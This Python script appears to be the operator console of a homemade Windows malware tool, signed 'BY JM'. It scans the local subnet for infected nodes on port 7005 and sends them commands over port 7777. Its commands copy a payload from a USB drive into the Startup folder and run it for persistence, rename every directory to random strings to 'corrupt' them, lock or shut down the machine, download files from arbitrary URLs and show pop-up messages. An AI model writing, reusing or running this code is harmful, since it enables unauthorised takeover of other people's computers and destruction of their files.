import random
import urllib.request
import string
import threading,ipaddress,subprocess
import os,shutil
import socket,json

class activeClients():
    def __init__(self):
        self.actList = []
        self.done = False
        strpInd = socket.gethostbyname(socket.gethostname()).rfind(".")
        net_addr = socket.gethostbyname(socket.gethostname())[:strpInd]+".0/24" 
        ip_net = ipaddress.ip_network(net_addr)
        self.all_hosts = list(ip_net.hosts())
        self.info = subprocess.STARTUPINFO()
        self.info.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        self.info.wShowWindow = subprocess.SW_HIDE
    def search(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        x = []
        for i in range(50):
            output = subprocess.Popen(['ping', '-n', '1', '-w', '400', str(self.all_hosts[i])], stdout=subprocess.PIPE, startupinfo=self.info).communicate()[0]
            if "Destination host unreachable" in output.decode('utf-8'):
                pass
            elif "Request timed out" in output.decode('utf-8'):
                pass
            else:
                try:
                    port = 7005
                    s.connect((str(self.all_hosts[i]), port))
                except ConnectionError:
                    pass
                else:
                    self.actList.append(str(self.all_hosts[i]))
        
        self.done = True

def commandparser(data):    
    commands = {"donld" : dwnld,"dirrnm" : dirrnm,"infct" : infct,"dny" : dny,"msg":msg}
    data = "".join(data.split("@"))
    data = data.split(" -")
    command = {"command" : data[0]}
    data.pop(0)
    for kwargs in data:
        if kwargs == "s":
            command.update({"s" : 1})
        else:
            kwargs = kwargs.split(" ",1)
            command.update({str(kwargs[0]) : kwargs[1]})
    commandtoCall = command["command"]
    command.pop("command")
    commands[commandtoCall](command)
    
def dwnld(data):
    if "s" in data.keys():
        data.pop("s")
        threading.Thread(target=download, args = (data))
        return
    if "u" not in data.keys():
        print("The correct way to use this command is @download -u url followed by: \n -e for the extension of the file \n -i for the ammount of downloads")
    else:
        url = data["u"]
        data.pop("u")
        if "e"  not in data.keys():
            ext = ".txt"
        else:
            ext = data["e"]
            data.pop("e")
        if "i" not in data.keys():
            iterations = 1
        else:
            iterations  = int(data["i"])
            data.pop("i")
        if len(data.keys()) == 0:
            for i in range(iterations):
                urllib.request.urlretrieve(url,''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(20))+str(ext))
        else:
            print("The correct way to use this command is @download -u url followed by: \n -e for the extension of the file \n -i for the ammount of downloads")
def infct(data):
    if "s" in data.keys():
        data.pop("s")
        threading.Thread(target=infct, args = (data))
    if "p" not in data.keys():
        path = "C:/Users/"+str(os.getlogin())+"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
    else:
        path = (data["p"])
        data.pop("p")
    if len(data.keys()) == 0:
        usbDrive = os.path.realpath(__file__)[:1]
        shutil.copy(str(usbDrive)+":/image.pyw",path)
        os.startfile(path+"/image.pyw")
    else:
        print("The correct way to use this command is @infct  followed by: \n -s for running silently \n -p to specify the path of file ")
def dirrnm(data):
    if "s" in data.keys():
        data.pop("s")
        threading.Thread(target=dirrnm, args = (data))
    if "p" not in data.keys():
        path = os.getcwd()
    else:
        path = data["p"]
        data.pop("p")
    if len(data.keys()) == 0:
        path = os.getcwd()
        directories = [ x for x in os.listdir('.') if os.path.isdir(x) ]
        for dirs in directories:
            os.rename(str(path)+str("/")+dirs,str(path)+str("/")+str(''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(20))))
    else:
         print("The correct way to use this command is @dirrnm followed by: \n -p to specify the path to corrupt")


def dny(data):
    import ctypes
    if "l" in data.keys():
        ctypes.windll.user32.LockWorkStation()
    elif "s" in data.keys():
        os.system('shutdown -s')
def msg(data):
    from tkinter import messagebox,Tk
    if "t" in data.keys():
        title = data["t"]
        data.pop("t")
        if "m" in data.keys():
            message = data["m"]
            data.pop("m")
        else:
            message = ""
        root = Tk()
        messagebox.showinfo(title, message)
        root.withdraw()
    else:
        print("The correct way to use this command is @msg -t to define the title followed by: \n -m for the message under the title.")
        
 


print("     __________  __      ____________   ")
print("     \______   \/  \    /  \______   \  ")
print("      |     ___/\   \/\/   /|       _/  ")
print("      |    |     \        / |    |   \  ")
print("      |____|      \__/\  /  |____|_  /  ")
print("                       \/          \/   ")
print("                   BY JM                ")
print("\n1) Local Mode")
print("2) Online mode")
choice  = int(input("> "))
if choice == 1:
    while 1:
        commandparser(input(">"))
    

if choice == 2:
    import sys,itertools,time

    spinner = itertools.cycle(['-', '/', '|', '\\'])
    nodes = activeClients()
    thread = threading.Thread(target = nodes.search)
    thread.start()
    sys.stdout.write("Searching for active nodes")
    while nodes.done == False:
        x = next(spinner)
        sys.stdout.write(x)  # write the next character
        sys.stdout.flush()   # flush stdout buffer (actual character display)
        sys.stdout.write('\b')
        time.sleep(0.1)
    print("\n Available nodes: ")
    for i in nodes.actList():
        print("> "+str(i))
    ip = input("Enter Client ip: ")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    port = 7777
    s.connect((ip, port))
    while 1:
        x = (input(">"))
        s.send(str.encode((x)))
    
        



